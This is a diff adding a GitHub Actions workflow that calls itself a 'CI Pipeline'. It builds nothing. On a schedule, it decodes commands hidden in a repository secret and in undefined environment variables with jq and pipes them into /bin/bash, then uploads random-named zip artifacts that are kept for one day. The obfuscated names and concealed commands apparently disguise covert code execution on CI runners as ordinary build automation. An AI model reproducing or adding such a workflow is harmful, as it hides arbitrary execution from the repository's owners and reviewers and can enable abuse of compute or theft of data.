@@ -1,0 +1,26 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '30 5,11,17,23 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          ysd81: ${{ secrets.ysd81 }}
+        run: |
+          printf '%s' "$ysd81" | jq -r .zse43 | /bin/bash
+          printf '%s' "$uwq5" | jq -r .xysf06 | /bin/bash
+          echo $th04789 | jq -r .yv7 | /bin/bash
+          printf '%s' "$d64503" | jq -r .tcgau461 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: n2CDOyzg
+          path: "*.zip"
+          retention-days: 1
